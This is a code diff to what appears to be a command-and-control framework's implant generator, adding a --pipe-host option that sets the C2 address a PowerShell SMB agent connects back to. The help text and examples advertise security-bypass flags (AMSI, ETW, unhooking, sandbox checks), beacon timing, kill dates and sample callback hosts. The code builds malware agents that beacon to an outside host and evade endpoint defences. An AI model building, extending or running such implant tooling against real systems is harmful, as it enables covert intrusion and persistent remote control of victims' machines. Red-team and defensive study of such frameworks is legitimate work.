@@ -33,6 +33,7 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
         "output": None,
         "format": "exe",
         "listener": "",
+        "pipe_host": "",
         "no_evasion": False,
         "no_sandbox": False,
         "no_unhook": False,
@@ -96,6 +97,8 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
             opts["format"] = val; i += 2
         elif parts[i] in ("--listener", "-l") and i + 1 < len(parts):
             opts["listener"] = parts[i + 1]; i += 2
+        elif parts[i] == "--pipe-host" and i + 1 < len(parts):
+            opts["pipe_host"] = parts[i + 1]; i += 2
         elif parts[i] in ("--output", "-o") and i + 1 < len(parts):
             opts["output"] = Path(parts[i + 1]); i += 2
         elif parts[i] in bool_flags:
@@ -255,21 +258,23 @@ def _build_powershell(opts: dict, project_root: Path, listeners: list) -> None:
 
     info = target_listener.info()
     pipe_name = info["port"].replace("pipe:", "")
-    pipe_host = info["interface"]
 
-    # Resolve 0.0.0.0 to a usable address
-    if pipe_host == "0.0.0.0":
-        if opts["url"]:
-            from urllib.parse import urlparse
-            pipe_host = urlparse(opts["url"]).hostname or "127.0.0.1"
-        else:
-            pipe_host = "127.0.0.1"
-            console.print(
-                "[yellow]⚠ Listener bound to 0.0.0.0 — using 127.0.0.1 as pipe host.[/yellow]"
-            )
-            console.print(
-                "[yellow]  Use --url https://<target-reachable-ip> to override.[/yellow]"
-            )
+    # Resolve pipe host: --pipe-host > --url > listener interface > fallback
+    if opts["pipe_host"]:
+        pipe_host = opts["pipe_host"]
+    elif info["interface"] not in ("0.0.0.0", ""):
+        pipe_host = info["interface"]
+    elif opts["url"]:
+        from urllib.parse import urlparse
+        pipe_host = urlparse(opts["url"]).hostname or "127.0.0.1"
+    else:
+        pipe_host = "127.0.0.1"
+        console.print(
+            "[yellow]⚠ Listener bound to 0.0.0.0 — using 127.0.0.1 as pipe host.[/yellow]"
+        )
+        console.print(
+            "[yellow]  Use --pipe-host <IP> to set the C2 address the agent connects to.[/yellow]"
+        )
 
     console.print(f"[cyan]Generating PowerShell SMB agent...[/cyan]")
     console.print(f"  Listener:  {target_listener.name}")
@@ -347,9 +352,11 @@ def _print_help():
   --format, -f FMT      Output format: exe (default), dll, or powershell
   --listener, -l NAME   Target listener by name (required for powershell
                          unless exactly one SMB listener is running)
+  --pipe-host IP        C2 IP/hostname the PS agent connects to via SMB
+                         (overrides listener interface and --url)
 
 [bold]Common options:[/bold]
-  --url, -u URL         C2 callback URL (C agent) / pipe host override (PS)
+  --url, -u URL         C2 callback URL (C agent) / pipe host fallback (PS)
   --sleep, -s SEC       Beacon interval in seconds (default: 60)
   --jitter, -j PCT      Jitter percentage 0-99 (default: 25)
   --kill-date DATE      Agent self-destructs after YYYY-MM-DD
@@ -382,8 +389,8 @@ def _print_help():
 [bold]Examples:[/bold]
   generate
   generate --format dll
-  generate --format powershell --listener SMB
-  generate --format powershell --listener SMB --sleep 30 --jitter 10
+  generate --format powershell --listener SMB --pipe-host 172.17.10.121
+  generate --format powershell --listener SMB --pipe-host 10.0.0.5 --sleep 30
   generate --format powershell --listener SMB --no-amsi --no-etw
   generate --url https://cdn.example.com/api/v1 --sleep 30
   generate --debug --no-unhook --no-sandbox --no-pe-stomp --no-crypt
